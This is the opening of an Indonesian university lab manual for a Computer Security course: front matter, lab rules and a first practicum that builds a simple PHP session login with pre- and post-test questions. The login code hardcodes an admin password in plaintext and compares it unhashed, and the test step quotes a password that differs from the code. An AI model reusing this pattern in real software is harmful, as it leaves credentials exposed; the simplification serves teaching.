<!-- Halaman 1 -->

## Keamanan Komputer

### Penyusun:

Ir. Nur Rochmah Dyah Puji Astuti, S.T., M.Kom. Eko Aribowo, S.T., M.Kom. Ir. Nuril Anwar, S.T., M.Kom.

---

<!-- Halaman 2 -->

### HAK CIPTA

### PETUNJUK PRAKTIKUM KEAMANAN KOMPUTER

Copyright© 2026, Ir. Nur Rochmah Dyah Puji Astuti, S.T., M.Kom. Eko Aribowo, S.T., M.Kom. Ir. Nuril Anwar, S.T., M.Kom. Hak Cipta dilindungi Undang-Undang Dilarang mengutip, memperbanyak atau mengedarkan isi buku ini, baik sebagian maupun seluruhnya, dalam bentuk apapun, tanpa izin tertulis dari pemilik hak cipta dan penerbit. Diterbitkan oleh: Program Studi Informatika Fakultas Teknologi Industri Universitas Ahmad Dahlan Jalan Ring Road Selatan, Tamanan, Banguntapan, Bantul Yogyakarta 55166 Penulis : Ir. Nur Rochmah Dyah Puji Astuti, S.T., M.Kom. Eko Aribowo, S.T., M.Kom. Ir. Nuril Anwar, S.T., M.Kom. Editor : Laboratorium S1 Informatika, Universitas Ahmad Dahlan Desain sampul : Laboratorium S1 Informatika, Universitas Ahmad Dahlan Tata letak : Laboratorium S1 Informatika, Universitas Ahmad Dahlan Ukuran/Halaman : 21 x 29,7 cm /106 halaman Didistribusikan oleh:

### Laboratorium S1 Informatika 
Universitas Ahmad Dahlan 
Jalan Ring Road Selatan, Tamanan, Banguntapan, Bantul Yogyakarta 55166 
Indonesia

---

<!-- Halaman 3 -->

### KATA PENGANTAR

Alhamdulilllah, segala puji dan syukur kehhadirat Allah SWT, hanya atas rahmat dan hidayah-

Nya lah akhirnya buku petunjuk praktikum kuliah Keamanan Komputer telah terselesaikan. Cakupan

Keamanan Komputer membahas tentang metode-metode yang dapat digunakan dalam pengamanan data digital dan jaringan internet antara lain : penggunaan autentikasi, kriptografi, steganografi, firewall, wireless security, digital signature, dll. Petunjuk praktikum mahasiswa berisi langkah-langkah pada kegiatan praktikum untuk mahasiswa semester V di program studi Informatika Universitas Ahmad

Dahlan. Capaian kompetensi setelah mahasiswa mengikuti kegiatan praktikum dalam mata kuliah keamanan komputer adalah mahasiswa mampu menganalisi dan mengimplementasikan konsep keamanan komputer. Mampu menganalisa dan mengimplementasikan sistem pengamanan data dan jaringan dengan metode firewall, steganografi. Mampu memberikan analisa atas perkembangan teknik pengamanan dan serangan yang ada pada sistem jaringan. Penulis mengucapkan terima kasih pihak yang tentunya tidak bisa penulis sebutkan satu persatu yang telah membantu dalam penyusunan. Tentu saja buku ini masih jauh dari memuaskan, namun penulis berharap buku ini dapat bermanfaat bagi mahasiswa. Saran dan kritik sangatlah penulis harapkan, untuk perkembangan selanjutnya.

Yogyakarta, 20 September 2026

Penyusun

---

<!-- Halaman 4 -->

### DAFTAR PENYUSUN

|  | Nama : Eko Aribowo, S.T., M.Kom Mata Kuliah : Kemanan Komputer, Kriptografi. Karya : 1. Petunjuk Praktikum Keamanan Komputer 2. Petunjuk Praktikum Kriptografi |
| --- | --- |
|  | Nama : Ir. Nur Rochmah D.P.A, S.T., M.Kom Mata Kuliah : Logika Informatika, Matematika diskrit, Kemanan Komputer, Kriptografi. Karya : 3. Petunjuk Praktikum Logika Informatika 4. Petunjuk Praktikum Matematika Diskret 5. Petunjuk Praktikum Keamanan Komputer 6. Petunjuk Praktikum Kriptografi 7. Buku Ajar Logika Informatika. 8. Buku Ajar Matematika Diskret. |
|  | Nama : Ir. Nuril Anwar, S.T., M.Kom. Mata Kuliah : Sistem Operasi Keamanan Komputer, Digital Forensik, Keamanan Informasi Karya : 1. Petunjuk Praktikum Keamanan Komputer 2. Petunjuk Praktikum Digital Forensik 3. Petunjuk Praktikum Keamanan Informasi |
|  | Nama : Dyllan Bagus Siswanto ( Alumni Informatika ) Nama : Rinday Zildjiani Salji ( Alumni Informatika ) |
|  |  |

---

<!-- Halaman 5 -->

### KONTRIBUSI PENULIS

| Nomor Bab | Daftar Penulis |
| --- | --- |
| Bab I | Ir. Nur Rochmah Dyah Puji Astuti, S.T., M.Kom. |
| Bab II | Ir. Nuril Anwar, S.T., M.Kom. |
| Bab III | Ir. Nuril Anwar, S.T., M.Kom. |
| Bab IV | Ir. Nur Rochmah Dyah Puji Astuti, S.T., M.Kom. |
| Bab V | Ir. Nur Rochmah Dyah Puji Astuti, S.T., M.Kom. |
| Bab VI | Eko Aribowo, S.T., M.Kom. |
| Bab VII | Eko Aribowo, S.T., M.Kom. |
| Bab VIII | Ir. Nur Rochmah Dyah Puji Astuti, S.T., M.Kom. |
| Bab IX | Ir. Nur Rochmah Dyah Puji Astuti, S.T., M.Kom. |
| Bab X | Ir. Nur Rochmah Dyah Puji Astuti, S.T., M.Kom. |
| Bab XI | Ir. Nur Rochmah Dyah Puji Astuti, S.T., M.Kom. |

---

<!-- Halaman 6 -->

### HALAMAN REVISI

Yang bertanda tangan di bawah ini:

### Nama  
: Ir. Nur Rochmah Dyah Puji Astuti, S.T., M.Kom.

NIP : 197608192005012001

Jabatan : Dosen Pengampu Mata Kuliah Keamanan Komputer

Dengan ini menyatakan pelaksanaan Revisi Petunjuk Praktikum Keamanan Komputer untuk Program Studi Informatika telah dilaksanakan dengan penjelasan sebagai berikut:

|  | No |  |  | Keterangan Revisi |  |  | Tanggal Revisi |  |  | Nomor Modul |  |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| 1 | 1 |  | a. Perubahan Template modul |  |  | 30/07/2023 |  |  | PP/018/VII/R1 |  |  |
| 2 |  |  | a. Penyesuaian urutan materi disesuaikan dengan RPS terbaru. b. Pembaharuan/perubahan pres test post test |  |  | 30/07/2023 |  |  | PP/018/VII/R2 |  |  |
| 3 |  |  | a. Penyesuian CPL dan CPMK b. Penambahan isi dan materi pembelajaran |  |  | 05/09/2024 |  |  | PP/018/IX/R3 |  |  |
|  | 4 |  | Tabel Revisi |  |  | 20/09/2026 |  |  | PP/018/IX/R4 |  |  |

Yogyakarta, 20 September 2026

Penyusun

### Ir. Nur Rochmah Dyah Puji Astuti, S.T., M.Kom.

NIP. 197608192005012001

---

<!-- Halaman 7 -->

### HALAMAN PERNYATAAN

Yang bertanda tangan di bawah ini:

Nama : Murein Miksa Mardhia S.T., M.T.

NIPM : 19891019 201606 011 1236278

Jabatan : Kepala Laboratorium S1 Informatika

Mengetahui, Ketua Program Studi

Yogyakarta, 20 September 2026

Kepala Laboratorium

Dr. Murinto, S.Si., M.Kom. NIPM. 19730710 200409 111 0951298

S1 Informatika

Murein Miksa Mardhia S.T., M.T. NIPM. 19891019 201606 011 1236278

---

<!-- Halaman 8 -->

### VISI DAN MISI PRODI INFORMATIKA

### VISI

Menjadi program studi yang unggul dan inovatif dalam bidang rekayasa perangkat lunak dan sistem cerdas dengan dijiwai nilai-nilai Islam.

### MISI

### 1. Mengimplementasikan nilai-nilai AIK pada semua aspek kegiatan.

2. Memajukan ilmu pengetahuan dan teknologi Rekayasa Perangkat Lunak dan Sistem cerdas melalui

### pendidikan, penelitian, dan pengabdian kepada masyarakat.

3. Mengembangkan kerjasama dalam pendidikan, penelitian, dan pengabdian kepada masyarakat di

### tingkat lokal, nasional, maupun internasional.

### 4. Menyelenggarakan tata kelola program studi yang unggul dan inovatif.

### 5. Berperan aktif dalam kegiatan yang menunjang profesi dosen.

---

<!-- Halaman 9 -->

### TATA TERTIB LABORATORIUM S1 INFORMATIKA

DOSEN/KOORDINATOR PRAKTIKUM 1. Dosen harus hadir saat praktikum minimal 15 menit di awal kegiatan praktikum untuk mengisi materi dan menandatangani presensi kehadiran praktikum. 2. Dosen membuat modul praktikum, soal seleksi asisten, pre-test, post-test, dan responsi dengan berkoordinasi dengan asisten dan pengampu mata praktikum. 3. Dosen berkoordinasi dengan koordinator asisten praktikum untuk evaluasi praktikum setiap minggu. 4. Dosen menandatangani surat kontrak asisten praktikum dan koordinator asisten praktikum. 5. Dosen yang tidak hadir pada slot praktikum tertentu tanpa pemberitahuan selama 2 minggu berturut-turut mendapat teguran dari Kepala Laboratorium, apabila masih berlanjut 2 minggu berikutnya maka Kepala Laboratorium berhak mengganti koordinator praktikum pada slot tersebut.

PRAKTIKAN 1. Praktikan harus hadir 15 menit sebelum kegiatan praktikum dimulai, dan dispensasi terlambat 15 menit dengan alasan yang jelas (kecuali asisten menentukan lain dan patokan jam adalah jam yang ada di Laboratorium, terlambat lebih dari 15 menit tidak boleh masuk praktikum & dianggap Inhal). 2. Praktikan yang tidak mengikuti praktikum dengan alasan apapun, wajib mengikuti INHAL, maksimal

4 kali praktikum dan jika lebih dari 4 kali maka praktikum dianggap GAGAL. 3. Praktikan yang akan mengikuti inhal diwajibkan mendaftarkan diri dan membayar administrasi inhal kepada laboran inhal paling lambat H-1 jadwal inhal. 4. Praktikan harus berpakaian rapi sesuai dengan ketentuan Universitas, sebagai berikut:

a. Tidak boleh memakai Kaos Oblong, termasuk bila ditutupi Jaket/Jas Almamater (Laki-laki /

Perempuan) dan Topi harus Dilepas. b. Tidak Boleh memakai Baju ketat, Jilbab Minim dan rambut harus tertutup jilbab secara sempurna, tidak boleh kelihatan di jidat maupun di punggung (khusus Perempuan). c. Tidak boleh memakai baju minim, saat duduk pun pinggang harus tertutup rapat (Laki-laki /

Perempuan). d. Laki-laki tidak boleh memakai gelang, anting-anting ataupun aksesoris Perempuan. 5. Praktikan tidak boleh makan dan minum selama kegiatan praktikum berlangsung, harus menjaga kebersihan, keamanan dan ketertiban selama mengikuti kegiatan praktikum atau selama berada di dalam laboratorium (tidak boleh membuang sampah sembarangan baik kertas, potongan kertas, bungkus permen baik di lantai karpet maupun di dalam ruang CPU). 6. Praktikan dilarang meninggalkan kegiatan praktikum tanpa seizin Asisten atau Laboran. 7. Praktikan harus meletakkan sepatu dan tas pada rak/loker yang telah disediakan. 8. Selama praktikum dilarang NGENET/NGE-GAME, kecuali mata praktikum yang membutuhkan atau menggunakan fasilitas Internet. 9. Praktikan dilarang melepas kabel jaringan atau kabel power praktikum tanpa sepengetahuan laboran 10. Praktikan harus memiliki FILE Petunjuk praktikum dan digunakan pada saat praktikum dan harus siap sebelum praktikum berlangsung. 11. Praktikan dilarang melakukan kecurangan seperti mencontek atau menyalin pekerjaan praktikan yang lain saat praktikum berlangsung atau post-test yang menjadi tugas praktikum.

---

<!-- Halaman 10 -->

12. Praktikan dilarang mengubah setting software/hardware komputer baik menambah atau mengurangi tanpa permintaan asisten atau laboran dan melakukan sesuatu yang dapat merugikan laboratorium atau praktikum lain. 13. Asisten, Koordinator Praktikum, Kepala laboratorium dan Laboran mempunyai hak untuk menegur, memperingatkan bahkan meminta praktikan keluar ruang praktikum apabila dirasa anda mengganggu praktikan lain atau tidak melaksanakan kegiatan praktikum sebagaimana mestinya dan atau tidak mematuhi aturan lab yang berlaku. 14. Pelanggaran terhadap salah satu atau lebih dari aturan diatas maka Nilai praktikum pada pertemuan tersebut dianggap 0 (NOL) dengan status INHAL. 15. Peraturan lain mengikuti aturan yang ditetapkan oleh Fakultas pada Surat Keputusan Dekan No.

F2/524/A/IX/2018. 16. Sebelum pelaksanaan praktikum membaca surat pendek. 17. Praktikan saat memasuki lab wajib menggunakan kaos kaki. 18. Praktikan dilarang mengganti wallpaper dekstop pada laboratorium yang digunakan

ASISTEN PRAKTIKUM 1. Asisten harus hadir 15 Menit sebelum praktikum dimulai (konfirmasi ke koordinator bila mengalami keterlambatan atau berhalangan hadir). 2. Asisten yang tidak bisa hadir WAJIB mencari pengganti, dan melaporkan kepada Koordinator

Asisten. 3. Asisten harus berpakaian rapi sesuai dengan ketentuan Universitas, sebagai berikut:

a. Tidak boleh memakai Kaos Oblong, termasuk bila ditutupi Jaket/Jas Almamater (Laki-laki /

Perempuan) dan Topi harus Dilepas. b. Tidak Boleh memakai Baju ketat, Jilbab Minim dan rambut harus tertutup jilbab secara sempurna, tidak boleh kelihatan di jidat maupun di punggung (khusus Perempuan). c. Tidak boleh memakai baju minim, saat duduk pun pinggang harus tertutup rapat (Laki-laki /

Perempuan). d. Laki-laki tidak boleh memakai gelang, anting-anting ataupun aksesoris Perempuan. 4. Asisten harus menjaga kebersihan, keamanan dan ketertiban selama mengikuti kegiatan praktikum atau selama berada di laboratorium, menegur atau mengingatkan jika ada praktikan yang tidak dapat menjaga kebersihan, ketertiban atau kesopanan. 5. Asisten harus dapat merapikan dan mengamankan presensi praktikum, Kartu Nilai serta tertib dalam memasukan/Input nilai secara Online/Offline. 6. Asisten mencatat dan merekap praktikan dengan status INHAL setiap minggu serta wajib mengumumkan mekanisme INHAL di awal pertemuan praktikum. 7. Asisten harus dapat bertindak secara profesional sebagai seorang asisten praktikum dan dapat menjadi teladan bagi praktikan. 8. Asisten harus dapat memberikan penjelasan/pemahaman yang dibutuhkan oleh praktikan berkenaan dengan materi praktikum yang diasisteni sehingga praktikan dapat melaksanakan dan mengerjakan tugas praktikum dengan baik dan jelas. 9. Asisten tidak diperkenankan mengobrol sendiri apalagi sampai membuat gaduh. 10. Asisten dimohon mengkoordinasikan untuk meminta praktikan agar mematikan komputer untuk jadwal terakhir dan sudah dilakukan penilaian terhadap hasil kerja praktikan. 11. Asisten wajib untuk mematikan LCD Projector dan komputer asisten/praktikan apabila tidak digunakan. 12. Asisten tidak diperkenankan menggunakan akses internet selain untuk kegiatan praktikum, seperti

Youtube/Game/Medsos/Streaming Film di komputer praktikan.

---

<!-- Halaman 11 -->

13. Peraturan lain mengikuti aturan yang ditetapkan oleh Fakultas pada Surat Keputusan Dekan No.

F2/524/A/IX/2018. 14. Sebelum pelaksanaan praktikum membaca surat pendek. 15. Asisten saat memasuki lab wajib menggunakan kaos kaki.

LAIN-LAIN 1. Pada Saat Responsi Harus menggunakan Baju Kemeja untuk Laki-laki dan Perempuan untuk

Praktikan dan Asisten. 2. Ketidakhadiran praktikum dengan alasan apapun dianggap INHAL. 3. Pelaksanaan (waktu dan metode) INHAL sama seperti praktikum mingguan/reguler. 4. Izin praktikum mengikuti aturan izin SIMERU/KULIAH. 5. Yang tidak berkepentingan dengan praktikum dilarang mengganggu praktikan atau membuat keributan/kegaduhan. 6. Penggunaan lab diluar jam praktikum maksimal sampai pukul 18.00 dengan menunjukkan surat ijin dari Kepala Laboratorium Prodi Informatika.

Yogyakarta, 20 September 2026

Kepala Laboratorium

S1 Informatika

Murein Miksa Mardhia S.T., M.T. NIPM. 19891019 201606 011 1236278

---

<!-- Halaman 12 -->

### DAFTAR ISI 
 
 HAK CIPTA .................................................................................................................................................. 1

KATA PENGANTAR ...................................................................................................................................... 2

DAFTAR PENYUSUN .................................................................................................................................... 3

KONTRIBUSI PENULIS ................................................................................................................................. 4

HALAMAN REVISI ....................................................................................................................................... 5

HALAMAN PERNYATAAN ............................................................................................................................ 6

VISI DAN MISI PRODI INFORMATIKA .......................................................................................................... 7

TATA TERTIB LABORATORIUM S1 INFORMATIKA ...................................................................................... 8

DAFTAR ISI ................................................................................................................................................ 11

DAFTAR GAMBAR ..................................................................................................................................... 12

DAFTAR TABEL .......................................................................................................................................... 13

SKENARIO PRAKTIKUM SECARA DARING ................................................................................................. 14

## PRAKTIKUM 1: 
 AUTHENTICATION .................................................................................................... 15

## PRAKTIKUM 2: 
PASSWORD MANAJEMEN ........................................................................................ 22

## PRAKTIKUM 3: 
 KRIPTOGRAFI KLASIK ............................................................................................... 31

## PRAKTIKUM 4: 
 KRIPTOGRAFI MODERN ........................................................................................... 41

## PRAKTIKUM 5: 
 INFORMATION HIDING ............................................................................................ 51

## PRAKTIKUM 6: 
 DIGITAL SIGNATURE ................................................................................................ 56

## PRAKTIKUM 7: 
 FIREWALL ................................................................................................................. 61

## PRAKTIKUM 8: 
 WIRELESS NETWORK SECURITY ............................................................................... 72

## PRAKTIKUM 9: 
 DoS dan DDoS .......................................................................................................... 80

## PRAKTIKUM 10: 
 SQL INJECTION ......................................................................................................... 88

## PRAKTIKUM 11: 
 ANALISA PAKET DATA .............................................................................................. 97

DAFTAR PUSTAKA ................................................................................................................................... 106

---

<!-- Halaman 13 -->

### DAFTAR GAMBAR

Gambar 5. 1 UI MD5 Utility ....................................................................... Error! Bookmark not defined. Gambar 7. 1 Proses inbound rule firewall 1 ............................................................................................. 64 Gambar 7. 2 Proses inbound rule firewall 2 ............................................................................................. 65 Gambar 7. 3 Proses inbound rule firewall 3 ............................................................................................. 65 Gambar 7. 4 Proses Inbound rule firewall 4 ............................................................................................. 66 Gambar 7. 5 Proses Inbound Rule Firewall 5 ........................................................................................... 66 Gambar 7. 6 Proses inbound rule firewall 6 ............................................................................................. 67 Gambar 7. 7 Proses inbound rule firewall 7 ............................................................................................. 67 Gambar 7. 8 Proses inbound rule firewall 8 ............................................................................................. 68 Gambar 7. 9 Proses inbound rule firewall 9 ............................................................................................. 68 Gambar 7. 10 Proses inbound rule firewall 10 ......................................................................................... 69 Gambar 8. 1 Security Profiles Winbox .................................................................................................. 74 Gambar 8. 2 WEP Security 1 .................................................................................................................. 74 Gambar 8. 3 WEP Security 2 .................................................................................................................. 75 Gambar 8. 4 WPA Security 1 ................................................................................................................. 75 Gambar 8. 5 WAP Security 2 ................................................................................................................. 75 Gambar 10. 1 Ilustrasi SQL Injection ..................................................................................................... 89 Gambar 10. 2 Hasil penyisipan karakter/symbol ...................................... Error! Bookmark not defined. Gambar 10. 3 Hasil percobaan ke 14 ........................................................ Error! Bookmark not defined. Gambar 10. 4 Hasil Langkah ke-5 (1) ......................................................... Error! Bookmark not defined. Gambar 10. 5 Hasil Langkah ke-5 (2) ......................................................... Error! Bookmark not defined. Gambar 10. 6 Hasil Langkah ke-6 .............................................................. Error! Bookmark not defined. Gambar 10. 7 Hasil Langkah ke-7 .............................................................. Error! Bookmark not defined. Gambar 11. 1 Halaman interface saat membuka wireshark................................................................. 99 Gambar 11. 2 interface capture ............................................................................................................ 99 Gambar 11. 3 Pilihan yang akan ditangkap ......................................................................................... 100 Gambar 11. 4 Halmaan utama saat capturing berlangsung ............................................................... 100 Gambar 11. 5 Menu dalam tampilan capturing .................................................................................. 100 Gambar 11. 6 Display filter .................................................................................................................. 101 Gambar 11. 7 Daftar paket yang berhasil ditangkap .......................................................................... 101 Gambar 11. 8 detail dari paket yang terpilih ...................................................................................... 101 Gambar 11. 9 detail paket dalam format heksadesimal ..................................................................... 101 Gambar 11. 10 hasil tangkapan Ketika mengakses Kompas.com ....................................................... 102 Gambar 11. 11 Detail dari web Kompas.com ...................................................................................... 102 Gambar 11. 12 detail dari web Kompas dalam format heksadesimal ................................................ 102

---

<!-- Halaman 14 -->

### DAFTAR TABEL

---

<!-- Halaman 15 -->

### SKENARIO PRAKTIKUM SECARA DARING

Nama Mata Praktikum : Keamanan Komputer Jumlah Pertemuan : 12 Pertemuan

### TABEL SKENARIO PRAKTIKUM LURING

| Pertemuan ke | Judul Materi | Waktu (Lama praktikum sampai pengumpulan posttest) | Skenario Praktikum (Dari pemberian pre-test, post-test dan pengumpulannya serta mencantumkan metode yang digunakan misal video, whatsapp group, Google meet atau lainnya) |
| --- | --- | --- | --- |
| 1 | Autentication | 90 Menit | Lab/WAG, Google Classroom |
| 2 | Password Manajemen | 90 Menit | Lab/WAG, Google Classroom |
| 3 | Digital Signature | 90 Menit | Lab/WAG, Google Classroom |
| 4 | Kriptografi Klasik | 90 Menit | Lab/WAG, Google Classroom |
| 5 | Kriptografi Modren | 90 Menit | Lab/WAG, Google Classroom |
| 6 | Information Hiding | 90 Menit | Lab/WAG, Google Classroom |
| 7 | Firewall | 90 Menit | Lab/WAG, Google Classroom |
| 8 | Wireless Network Security | 90 Menit | Lab/WAG, Google Classroom |
| 9 | DoS dan DDoS | 90 Menit | Lab/WAG, Google Classroom |
| 10 | SQL Injection | 90 Menit | Lab/WAG, Google Classroom |
| 11 | Analisa Paket Data | 90 Menit | Lab/WAG, Google Classroom |
| 12 | Responsi | 90 Menit | Lab/WAG, Google Classroom |

---

<!-- Halaman 16 -->

## PRAKTIKUM 1:      AUTHENTICATION

Pertemuan ke : 1 Total Alokasi Waktu : 90 menit ● Materi : 15 menit ● Pre-Test : 15 menit ● Praktikum : 45 menit ● Post-Test : 15 menit Total Bobot Penilaian : 100% ● Pre-Test : 20 % ● Praktik : 30 % ● Post-Test : 50 % Pemenuhan CPL dan CPMK:

| CPL 01-S01 | Menjunjung tinggi nilai kemanusiaan untuk menjalankan tugas berdasarkan agama, moral, etika, dan bernegara berdasarkan Pancasila dengan menunjukkan sikap bertanggung jawab atas pekerjaan di bidang keahliannya secara mandiri maupun berkelompok dalam kehidupan bermasyarakat. |
| --- | --- |
| CPMK 5.1.1 | Mampu menganalisa jenis-jenis serangan dan penerapan konsep keamanan untuk menangkal jenis-jenis serangan dan menerapkan prinsip pengamamanan dengan autentikasi berbasis password, token,biometric dan Remote User Authentication. |

1.1. DESKRIPSI CAPAIAN PEMBELAJARAN Setelah mengikuti praktikum ini mahasiswa diharapkan mampu: 1. Memahami dan mengimplementasikan prinsip autentikasi. 1.2. INDIKATOR KETERCAPAIAN PEMBELAJARAN Indikator ketercapaian diukur dengan:

| CPL 01-S01 | CPMK 5.1.1 | Mampu menganalisa jenis-jenis serangan dan penerapan konsep keamanan untuk menangkal jenis-jenis serangan dan menerapkan prinsip pengamamanan dengan autentikasi berbasis password, token,biometric dan Remote User Authentication. |
| --- | --- | --- |

### 1.3. TEORI PENDUKUNG

Auntetikasi adalah suatu Langkah untuk menentukan atau mengidentifikasi bahwa seseorang (atau sesuatu) adalah autentik atau asli. Melakukan autentikasi terhadap sebuah objek adalah melakukan konfirmasi terhadap kebenarannya. Sedangkan melakukan autentikasi terhadap seseorang

---

<!-- Halaman 17 -->

biasanya adalah untuk memverifikasi identitasnya. Autentikasi memastikan bahwa pengguna yang mencoba mengakses suatu sistem adalah benar-benar pengguna yang diakui dan diizinkan. Pada suatu sistem komputer, autentikasi biasanya terjadi pada saat login atau permintaan akses.

Selain itu authentification juga merupakan salah satu dari banyak metode yang digunakan untuk menyediakan bukti bahwa dokumen tertentu yang diterima secara elektronik benar-benar datang dari orang yang bersangkutan dan tak berubah caranya adalah dengan mengirimkan suatu kode tertentu melaui e-mail dan kemudian pemilik e-mail mereplay email tersebut atau mengetikan kode yang telah dikirimkan.

Berikut beberapa konsep dasar terkait autentikasi berbasis web: 1. Metode Autentikasi :

### a. Autentikasi Berdasarkan Kata Sandi (Password-based Authentication) : Ini adalah metode

yang paling umum, di mana pengguna memasukkan kombinasi nama pengguna dan kata sandi untuk diverifikasi. b. OAuth (Open Authorization): Protokol yang memungkinkan pengguna memberikan akses terbatas ke sumber daya mereka di situs atau aplikasi tanpa harus membagikan kredensial mereka. c. Single Sign-On (SSO): Sistem ini memungkinkan pengguna untuk masuk sekali dan kemudian mendapatkan akses ke beberapa aplikasi tanpa harus masuk ulang. d. Token-based Authentication (JWT - JSON Web Token): Menggunakan token yang dihasilkan setelah proses autentikasi berhasil, yang dapat digunakan untuk mengakses berbagai sumber daya tanpa harus mengirim ulang kredensial. e. Autentikasi Dua Faktor (2FA): Menggabungkan dua elemen, biasanya kata sandi dan kode yang dikirim melalui perangkat lain, untuk menambah lapisan keamanan. 2. Prinsip Keamanan dalam Autentikasi :

### a. Hashing Kata Sandi: Untuk melindungi kata sandi di database, kata sandi yang disimpan

biasanya di-hash menggunakan algoritma seperti bcrypt, SHA-256, atau Argon2. b. Manajemen Sesi: Sistem harus menggunakan sesi yang aman (secure sessions) untuk menjaga data pengguna tetap aman saat mereka masuk ke situs web. Cookie harus dienkripsi dan memiliki masa kedaluwarsa yang tepat. c. Rate Limiting: Pembatasan jumlah upaya masuk untuk mencegah serangan brute-force. d. CSRF (Cross-Site Request Forgery) Protection: Melindungi aplikasi web dari eksploitasi yang memaksa pengguna yang diautentikasi untuk melakukan tindakan yang tidak diinginkan di aplikasi web. Autentikasi berbasis web adalah elemen penting dalam keamanan aplikasi web, dan penting untuk menggabungkan beberapa metode serta mengikuti praktik keamanan terbaik untuk menjaga data pengguna tetap aman.

1.1. HARDWARE DAN SOFTWARE Hardware dan software yang digunakan dalam praktikum ini yaitu: 1. Komputer. 2. Sublem/ Notepad++/ Atom 3. XAMPP 1.2. PRE-TEST Jawablah pertanyaan berikut (Total Skor: 100):

| No | CPL | CPMK | Pertanyaan | Skor |
| --- | --- | --- | --- | --- |

---

<!-- Halaman 18 -->

| 1. | CPL 01S01 | CPMK 5.1.1 | Jelaskan apa itu authentikasi! | 30 |
| --- | --- | --- | --- | --- |
| 2. |  |  | Bagaimana cara kerja atau konsep dari authentikasi! | 40 |
| 3. |  |  | Analisislah kapan authentikasi diperlukan pada sebuah sistem! | 30 |

### 1.3. LANGKAH PRAKTIKUM

### Aturan Penilaian (Total Skor: 100):

| No | CPL | CPMK | Pertanyaan | Dokumen Pendukung | Skor |
| --- | --- | --- | --- | --- | --- |
| 1. | CPL 01S01 | CPMK 5.1.1 | Selesaikan langkah praktikum 1 – 4 | Hasil praktikum langkah 1 – 4 | 100 |

### Langkah-Langkah Praktikum:

### 1. Langkah 1: Buat direktori/folder baru di dalam local web server Anda (htdocs/keamanan-

komputer_3digitNIM/Pertemuan1). 2. Membuat file index.php dengan kode php sebagai berikut:

```
<?php session_start(); ?> 
<!DOCTYPE html> 
<html lang="id"> 
<head> 
    <meta charset="UTF-8"> 
    <title>Login - Praktikum Keamanan Komputer</title> 
    <style> 
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, 
sans-serif; background: #eef2f3; display: flex; justify-content: 
center; align-items: center; height: 100vh; margin: 0; } 
        .card { background: #ffffff; padding: 30px; border-radius: 
10px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 350px; } 
        .card h2 { text-align: center; color: #333; margin-bottom: 
20px; } 
        .form-group { margin-bottom: 15px; } 
        .form-group label { display: block; margin-bottom: 5px; 
color: #666; font-size: 14px; } 
        .form-group input { width: 100%; padding: 10px; box-sizing: 
border-box; border: 1px solid #ddd; border-radius: 5px; font-size: 
14px; } 
        .btn { width: 100%; padding: 10px; background: #4f46e5; 
border: none; color: white; border-radius: 5px; font-weight: bold; 
cursor: pointer; transition: background 0.3s; } 
        .btn:hover { background: #4338ca; } 
        .alert { background: #fee2e2; color: #991b1b; padding: 
10px; border-radius: 5px; font-size: 13px; margin-bottom: 15px; 
text-align: center; } 
    </style> 
</head> 
<body> 
 
<div class="card"> 
```

---

<!-- Halaman 19 -->

```
    <h2>Silakan Login</h2> 
 
    <!-- Menampilkan alert jika username/password salah --> 
    <?php if (isset($_SESSION['error'])): ?> 
        <div class="alert"> 
            <?php  
                echo $_SESSION['error'];  
                unset($_SESSION['error']);  
            ?> 
        </div> 
    <?php endif; ?> 
 
    <form action="auth.php" method="POST"> 
        <div class="form-group"> 
            <label>Username</label> 
            <input 
type="text" 
name="username" 
required 
autocomplete="off"> 
        </div> 
        <div class="form-group"> 
            <label>Password</label> 
            <input type="password" name="password" required> 
        </div> 
        <button 
type="submit" 
name="login" 
class="btn">Login</button> 
    </form> 
</div> 
 
</body> 
</html> 
 
3. Membuat file auth.php dengan kode sebagai berikut: 
<?php 
session_start(); 
 
$database_user = [ 
    'username' => 'admin', 
    'password' => 'admin123',  
    'role'     => 'Administrator' 
]; 
 
if (isset($_POST['login'])) { 
    $username = trim($_POST['username']); 
    $password = trim($_POST['password']); 
 
    // Validasi pencocokan data dengan "database" array 
    if ($username === $database_user['username'] && $password === 
$database_user['password']) { 
        // Jika Berhasil 
        $_SESSION['username'] = $database_user['username']; 
        $_SESSION['role']     = $database_user['role']; 
         
        header("Location: dashboard.php"); 
        exit(); 
    } else { 
```

---

<!-- Halaman 20 -->

```
        // Jika Gagal, set pesan alert error 
        $_SESSION['error'] = "Username atau Password salah!"; 
        header("Location: index.php"); 
        exit(); 
    } 
} else { 
    header("Location: index.php"); 
    exit(); 
} 
?> 
 
4. Halaman Dashboard (dashboard.php) 
<?php 
session_start(); 
if (!isset($_SESSION['username'])) { 
    header("Location: index.php"); 
    exit(); 
} 
?> 
<!DOCTYPE html> 
<html lang="id"> 
<head> 
    <meta charset="UTF-8"> 
    <title>Dashboard</title> 
    <style> 
        body { font-family: sans-serif; text-align: center; 
padding-top: 100px; background: #f9fafb; } 
        .box { background: white; display: inline-block; padding: 
40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.05); 
} 
        .btn-logout { display: inline-block; margin-top: 20px; 
padding: 8px 20px; background: #dc2626; color: white; text-
decoration: none; border-radius: 4px; font-weight: bold; } 
        .btn-logout:hover { background: #b91c1c; } 
    </style> 
</head> 
<body> 
    <div class="box"> 
        <h2>Selamat 
Datang, 
<?php 
echo 
htmlspecialchars($_SESSION['username']); ?>!</h2> 
        <p>Anda berhasil masuk ke sistem (Mode Tanpa Database).</p> 
        <a href="logout.php" class="btn-logout">Logout</a> 
    </div> 
</body> 
</html> 
Figure 1 
```

### 5. Proses Logout (logout.php)

```
<?php 
session_start(); 
session_unset(); 
session_destroy(); 
header("Location: index.php"); 
exit(); 
?> 
Figure 2 
```

---

<!-- Halaman 21 -->

6. Lakukan pengujian pada halaman web diatas melalui web browser dengan login yang benar, user:

admin, password: admin, lalu lakukan Kembali dengan mengisi user yang kosong dan salah. 1.4. POST TEST

Jawablah pertanyaan berikut (Total Skor: 100):

| No | CPL | CPMK | Pertanyaan | Skor |
| --- | --- | --- | --- | --- |
| 1. | CPL 01S01 | CPMK 5.1.1 | Pada file index.php, form login menggunakan metode pengiriman POST dengan tujuan file action="auth.php". Jelaskan apa yang akan terjadi pada sistem atau variabel penangkap jika atribut method="POST" pada form tersebut diubah menjadi GET | 50 |
